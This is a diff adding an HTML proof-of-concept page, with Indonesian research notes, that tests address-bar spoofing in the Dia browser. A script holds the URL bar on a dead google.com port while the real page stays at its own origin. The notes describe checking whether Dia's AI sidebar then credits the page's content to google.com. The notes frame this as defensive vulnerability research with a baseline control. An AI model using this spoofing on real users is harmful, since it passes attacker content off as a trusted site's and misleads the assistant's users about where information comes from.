@@ -1,0 +1,33 @@
+<!-- SF-DIA-10 | GENOME A=dead-port(DROP)+arm-ulang B=location.href tab-sekarang C=klik + interval 9800ms D=permukaan Dia-native (chip konteks AI / bilah-URL-sekaligus-prompt / Memory) E=- F=same-doc G=sidebar-AI (topologi khas Dia) X=dia-macos
+     KENAPA INI BEDA SENDIRI: sembilan arm lain memakai permukaan yang dimiliki SEMUA Chromium. Yang ini memakai
+                permukaan yang hanya dipunyai Dia - bilah URL yang sekaligus kotak prompt, chip "halaman ini" di
+                sidebar AI, dan Memory. Permukaan yang lahir belakangan hampir tidak pernah ikut di-audit saat
+                sebuah fix bar dikirim, dan tiap permukaan baru = satu kolom varian baru.
+     PREDIKAT : sidebar AI (atau chip konteks / entri Memory) menyebut halaman ini sebagai www.google.com sementara
+                isi yang dibacanya adalah dokumen origin di panel. Atribusi jadi salah DUA arah sekaligus:
+                konten penyerang dilabeli merek lain, dan merek lain "seolah" berkata lewat mulut asisten.
+     ORACLE   : Run 10 -> tanpa menutup tab, buka sidebar AI (Cmd+E) -> tanya: "URL halaman ini apa?" lalu
+                "ringkas halaman ini". VULN = jawabannya menyebut google.com TAPI isinya memuat penanda di bawah.
+                Cek juga chip/judul konteks dan entri Memory/History setelahnya. Screenshot jawaban + panel.
+     EXPECTED-SECURE: asisten mengambil konteks dari dokumen yang benar-benar commit (origin di panel), bukan dari
+                teks yang sedang ditampilkan bilah URL; kalau navigasi belum commit ia menolak/menyebut about:blank.
+     KONTROL  : tombol BASELINE = tanpa HOLD. Tanya hal yang sama; catat bentuk jawaban jujurnya dulu.
+                Tanpa baseline, "AI menyebut google.com" tidak bisa dibedakan dari halusinasi model biasa.
+     CATATAN  : arm ini mengirim isi halaman ini ke layanan AI Dia (akun & halaman milikmu sendiri, isinya penanda
+                riset). Jangan jalankan di tab yang memuat data pihak lain.
+     STATUS   : HIPOTESIS 🟠 turunan-sendiri - belum diuji, belum dikorroborasi sumber luar. -->
+<meta charset="utf-8"><title>10 Dia AI context attribution</title>
+<h3>10 &mdash; apa yang disebut asisten Dia sebagai "halaman ini"?</h3>
+<p>Penanda halaman: <b>DIA-POC-MARKER-7F3A</b> (kalau jawaban AI memuat penanda ini tapi menyebut google.com, predikat terpenuhi)</p>
+<button onclick="run(1)">Run 10 (dengan HOLD)</button> <button onclick="run(0)">BASELINE (tanpa HOLD)</button>
+<pre id="p"></pre>
+<script>
+var T = 'https://www.google.com:9090/';
+document.getElementById('p').textContent =
+  'REAL origin : ' + location.origin + '\nREAL href   : ' + location.href +
+  '\nLangkah: Run -> Cmd+E -> tanya "URL halaman ini apa?" lalu "ringkas halaman ini".';
+function run(hold){
+  history.pushState({}, '', '/trusted');
+  if (hold) { location.href = T; setInterval(function(){ location.href = T; }, 9800); }
+}
+</script>
